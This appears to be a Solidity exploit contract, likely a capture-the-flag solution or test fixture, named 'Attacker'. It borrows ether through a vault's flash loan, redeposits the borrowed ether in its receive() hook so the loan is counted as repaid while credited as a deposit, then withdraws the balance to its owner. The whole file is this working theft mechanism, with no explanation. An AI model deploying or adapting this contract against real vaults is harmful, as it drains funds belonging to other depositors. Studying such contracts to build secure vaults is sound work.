// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IVault {
    function deposit() external payable;

    function withdraw() external;

    function flashloan(uint256 amount) external;
}

contract Attacker {
    IVault public vault;
    address public owner;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() public payable {
        vault.flashloan(1 ether);
    }

    function withdraw() public {
        vault.withdraw();
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        vault.deposit{value: msg.value}();
    }
}
